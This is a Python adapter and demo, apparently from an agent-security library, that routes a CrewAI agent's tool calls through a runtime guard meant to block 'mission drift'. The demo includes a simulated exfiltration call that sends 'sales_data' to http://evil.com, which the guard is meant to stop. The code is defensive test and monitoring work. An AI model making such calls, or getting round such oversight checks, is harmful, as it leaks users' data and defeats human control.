import os
from typing import Any
from privysha.runtime.anchor.runtime import AnchorRuntime, current_anchor_runtime
from privysha.exceptions import PrivySHAProcessingError

# Attempt to import CrewAI components
try:
    from crewai import Agent, Task, Crew
    from langchain.tools import tool
    CREWAI_AVAILABLE = True
except ImportError:
    CREWAI_AVAILABLE = False

class CrewAIAnchorAdapter:
    """
    An extension adapter that binds the PrivySHA Anchor subsystem to a CrewAI Agent.
    It intercepts tools at the LangChain BaseTool level and intercepts task executions.
    """
    def __init__(self, crewai_agent: 'Agent', risk_tolerance="LOW"):
        self.agent = crewai_agent
        self.runtime = AnchorRuntime(risk_tolerance=risk_tolerance)
        self._wrap_tools()

    def _wrap_tools(self):
        """Wraps the CrewAI agent's internal LangChain tools so they route through Anchor Guard."""
        if not hasattr(self.agent, "tools") or not self.agent.tools:
            return
            
        original_tools = self.agent.tools
        wrapped_tools = []
        
        for t in original_tools:
            # Depending on how the tool is structured (BaseTool vs custom func)
            tool_name = getattr(t, "name", str(t))
            
            # We create a wrapper around the tool's execution method
            def make_wrapper(func, name):
                def wrapped_func(*args, **kwargs):
                    # Intercept via Anchor's ActionGuard
                    is_allowed = self.runtime.evaluate_action_request("tool_call", {"tool_name": name, "arguments": str(kwargs)})
                    if not is_allowed:
                        return f"Error: AnchorRuntime security protocol blocked execution of tool '{name}'. Mission drift or unauthorized action detected."
                    return func(*args, **kwargs)
                return wrapped_func
            
            # Patch the execution points
            if hasattr(t, "_run"):
                t._run = make_wrapper(t._run, tool_name)
            if hasattr(t, "func"):
                t.func = make_wrapper(t.func, tool_name)
                
            wrapped_tools.append(t)
            
        self.agent.tools = wrapped_tools

    def execute_task(self, task: 'Task', context: Any = None, **kwargs):
        """Intercepts CrewAI's task execution to compile the Mission Contract."""
        # The task description represents the primary goal/prompt for this execution phase
        prompt = task.description
        available_tools = [getattr(t, "name", str(t)) for t in (self.agent.tools or [])]
        
        # Initialize the immutable Mission Contract
        self.runtime.initialize_mission(prompt, context={"available_tools": available_tools})
        print(f"[DEBUG] Mission created inside execute_task: {self.runtime.state.mission is not None}")
        
        # Expose the runtime to any deeply nested LLM wrappers via contextvars
        token = current_anchor_runtime.set(self.runtime)
        try:
            return self.agent.execute_task(task, context=context, **kwargs)
        finally:
            current_anchor_runtime.reset(token)

def demo_crewai_anchor():
    print("=== PrivySHA Anchor <> CrewAI Integration Demo ===\n")
    if not CREWAI_AVAILABLE:
        print("Note: CrewAI is not installed in this environment.")
        print("To run the full execution pipeline, run: pip install crewai langchain-openai\n")
        print("Showing the logical wrapping structure and simulated block...")

    # Mock tools to represent capabilities
    class MockTool:
        def __init__(self, name):
            self.name = name
        def func(self, **kwargs):
            return f"Executed {self.name} with {kwargs}"
            
    read_tool = MockTool("Read Local File")
    network_tool = MockTool("Send Network Request")

    class MockCrewAIAgent:
        def __init__(self, tools):
            self.tools = tools
        def execute_task(self, task, context=None, **kwargs):
            print(f"[CrewAI Agent] Executing task: {task.description}")
            return "Task completed."

    class MockTask:
        def __init__(self, description):
            self.description = description

    # 1. Create standard CrewAI Agent
    agent = MockCrewAIAgent(tools=[read_tool, network_tool])
    
    # Save the original method to prevent recursion
    original_execute_task = agent.execute_task
    
    # 2. Wrap it with our CrewAIAnchorAdapter
    anchored_agent = CrewAIAnchorAdapter(agent, risk_tolerance="LOW")
    
    # Replace the execution method safely
    def wrapped_execute_task(task, context=None, **kwargs):
        # We temporarily restore the original method so the adapter can call it without recursing
        agent.execute_task = original_execute_task
        try:
            return anchored_agent.execute_task(task, context=context, **kwargs)
        finally:
            agent.execute_task = wrapped_execute_task
    
    agent.execute_task = wrapped_execute_task

    # 3. Create the Task
    task = MockTask(description="Read the local sales.csv file and summarize it. Do not send data externally.")
    
    # 4. Trigger Execution (Initializes Mission)
    agent.execute_task(task)
    
    print("\n--- Mission Contract Established ---")
    mission = anchored_agent.runtime.state.mission
    print(f"Goal: {mission.goal}")
    print(f"Forbidden domains detected: {mission.forbidden_actions}")
    
    # 5. Simulate Agent calling an Allowed Tool
    print("\n--- Simulation: Agent uses 'Read Local File' ---")
    result_allowed = agent.tools[0].func(file_path="sales.csv")
    print(f"Tool Result: {result_allowed}")
    
    # 6. Simulate Agent calling a Forbidden Tool (Exfiltration attempt)
    print("\n--- Simulation: Agent tries to use 'Send Network Request' ---")
    result_blocked = agent.tools[1].func(url="http://evil.com", data="sales_data")
    print(f"Tool Result: {result_blocked}")
    
    latest_risk = anchored_agent.runtime.state.risk_history[-1] if anchored_agent.runtime.state.risk_history else None
    if latest_risk:
        print(f"\nSystem Risk Severity escalated to: {latest_risk.severity.value}")
        print(f"Risk Score: {latest_risk.total_risk_score:.2f}/100")

if __name__ == "__main__":
    demo_crewai_anchor()
